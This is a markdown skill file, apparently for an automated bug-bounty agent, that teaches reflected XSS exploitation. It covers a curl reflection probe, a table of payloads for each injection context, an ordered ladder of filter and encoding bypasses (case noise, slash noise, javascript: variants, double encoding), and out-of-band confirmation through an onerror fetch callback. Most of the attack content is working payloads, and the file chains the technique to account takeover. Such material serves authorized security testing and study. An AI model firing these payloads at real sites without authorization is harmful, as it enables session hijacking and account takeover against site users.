---
name: attack-xss-reflective
description: "Reflected XSS — response reflection hunting, context determination (HTML body / attribute / JS string / URL), context-specific payload engineering, encoding bypass"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - xss
  - reflective
  - payload
  - encoding
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-xss
  - attack-account-takeover
prerequisites:
  - attack-xss
---

# Reflected XSS

## Objective

Get an attacker-controlled script to execute where user input is returned in the HTTP
response without stored persistence. Effectiveness depends almost entirely on knowing
WHICH context the reflection lands in — a payload that is wrong for the context is
dead regardless of filter strength.

## Methodology

### 1. Find every reflection first

```bash
# Parameter discovery → reflection map (one request per param, two unique markers)
# Use two markers to prove BOTH contexts: html-safe and attribute-safe.
curl -s "https://target.com/search?q=jstt7<b>zzz&ref=jstt8<img%20src=x>zzz"
```

Confirm: does the marker come back URL-encoded, entity-encoded, stripped, or raw?
Browsers only execute raw. That answer decides everything downstream.

### 2. Determine the context, then switch payloads accordingly

| Reflection lands in | Test vector | Payload direction |
|---|---|---|
| HTML body | `<h3>j9<b>zz</h3>` | Terminate the tag if you control `</`; otherwise new tag `<svg onload=alert(1)>` |
| Attribute value | `<input value="j9">` | `"><script>alert(1)</script>` if quotes allowed; else `onmouseover` event without breaking out: `" onfocus=alert(1) autofocus x="` |
| Attribute name position | `<a href="/x" j9=...>` | Event-handler name or `autofocus/onfocus` injection |
| JS string | `var x = "j9";` | `"-alert(1)-"` or `\x27;alert(1)//` — match the quoting style |
| JS template literal | `var x = \`j9\`` | `${alert(1)}` interpolation |
| URL (href/src) | `<a href="j9">` | `javascript:alert(1)` (works when scheme filter is absent) |
| Post single-quote/slash | same line | `'>` then close tag and inject |
| Comment | `<!-- j9 -->` | `--><svg onload=alert(1)>` |
| After `</textarea>/<title>` | — | Close the special context first: `</textarea><script>alert(1)</script>` |

### 3. Encoding and filter bypass ladder (in this order)

1. Case noise: `<ScRiPt>`, `<sVg/oNloAd=alert(1)>`
2. Slash noise: `<svg/onload=alert(1)>`, `<a//href=javascript:alert(1)>`
3. Attribute fuzz: no quotes, single quotes, backticks
4. Tag fuzz: `<xss id=x tabindex=1 onactivate=alert(1)>`, unclosed `<svg` `<img` `<video <audio`
5. Event fallback when `<script>` is stripped: `onfocus`, `onmouseover`, `onstart`, `ontoggle`, `onpointerdown`, `onanimationstart` (+ CSS `animation-name` hook for onanimationstart)
6. `"javascript:"` variants: `JaVaScRiPt:`, `java\tscript:` (tab paste), `&#106;avascript:` (if entity-decode happens post-filter)
7. Double-encoding only when the app decodes twice (e.g. filter decodes once, template engine again)

### 4. Prove execution, not reflection

A reflected string alone is CANDIDATE evidence only. Final step is one of:
- headless browser (`hackbrowser`) shows `alert`/console fired
- interactsh/Burp Collaborator DNS hit from an `onerror=fetch('//oob')` style callback

Report without this = dead-on-triage candidate.

## Notes

- Reflections inside JSON responses can still execute via `Content-Type` sniffing in
  obscure cases — but prefer documented sink contexts; do not report sniffing alone.
- Same-reflection-same-context: rotate endpoint parameters ×2 unique markers per param,
  never spray payloads before you know the context.
